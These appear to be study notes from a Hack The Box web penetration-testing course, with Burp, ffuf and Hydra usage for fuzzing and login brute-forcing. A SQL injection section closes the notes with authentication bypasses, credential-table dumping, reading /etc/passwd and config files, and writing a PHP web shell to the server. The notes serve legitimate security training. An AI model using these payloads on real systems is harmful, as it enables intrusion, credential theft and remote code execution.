#  HTB – Penetration Testing Notes for Web Apps

Author: James Saltmer  

---

## 1) Proxies And Burpsuite
### Match and Replace Rules Example (Proxy>Proxy settings>HTTP match and replace rules)
| Field | Value (Example) | Description |
|---|---|---|
|`Type`| `Request header` | Make a change in the request header (not the main body). |
| `Match` | `^User-Agent.*$` | Regex pattern captures the entire line which contains User-Agent |
| `Replace` | `User-Agent: Test Agent 1.0` | This will replace the line (Old agent) with the new agent (Test Agent 1.0) |
| `Regex match` | `True` | In this case the exact User-Agent string / name might not be known so use the regex to match and replace the specified pattern |

### Set a Burpsuite Proxy In metasploit Module:
```bash
set PROXIES HTTP:127.0.0.1:8080
```

## 2) Ffuf

### Getting Started
Help:
```bash
ffuf -h
```

Basic Directory Enum
```bash
#  | -w : Wordlist | -u : URL | -t : threads |
ffuf -w <SNIP>:FUZZ -u http://SERVER_IP:PORT/FUZZ 
```

### Extensions
Fuzz for the Type of Extension Used:
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
```

Fuzz for directories ending in specified exension (.PHP in this case):
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
```

### Reccursive Enumeration
Run ffuf with a recursion depth of 1 for directories with php extension:
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```


### Subdomain Fuzzing
```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
```

### VHost Fuzzing
```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

### FFUF Filtering
Filter Out Responses Based on Size:
```bash
# Filter out responses with a size of 900
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
```

### Enumerate Parameters
Enumerate Get Params
```bash
# Change xxx to filter out responses
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

Enumerate Post params
```bash
# Change xxx to filter out responses
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

Enumerate Param Values
```bash
# Example wordlist Numbers (1-1000)
for i in $(seq 1 1000); do echo $i >> ids.txt; done

# Fuz the value of id parameter in the post body with numbers from 1-1000
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

## 3) Web Login Bruteforce

Bruteforce with POST request
```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^"
# Could aslo change to "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" to set fail condition
# Or "/login:user=^USER^&pass=^PASS^:S=302" for success condition on response codes
```

Bruteforce with GET request
```bash
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get /
```

## 4) SQL Injection
### Basic Payload
```sql
admin' or '1'='1

admin' or '1'='1' --

admin' or '1'='1' -- -
```

### Union (MYSQL)
Detect Number of Columns
```sql
' order by 1-- -

cn' UNION select 1,2,3-- -
```

Injection
```sql
cn' UNION select 1,@@version,3,4-- -
```
Injection for 4 columns
```sql
UNION select username, 2, 3, 4 from passwords-- -
```

Enumerate Database Names
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Check Current Database
```sql
cn' UNION select 1,database(),2,3-- -
```

Enumerate Tables within a database (dev in this case)
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Enumerate Columns from table (credentials in this case)
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Query Data from Table
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Get Current DB User
```sql
cn' UNION SELECT 1, user(), 3, 4-- -

cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Check Current User Privileges
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

-- Y Would mean the user has superuser privileges

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

-- Current user root privileges
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
Read a File
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

Write to a File requires:
1. User with FILE privilege enabled
2. MySQL global secure_file_priv variable not enabled
3. Write access to the location we want to write to on the back-end server

Check if secure_file_priv is empty
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Write PHP Shell to file
```sql
cn' union select 1,'<?=`$_GET[0]`?>',3,4 into outfile '/var/www/html/test.php'-- -
```
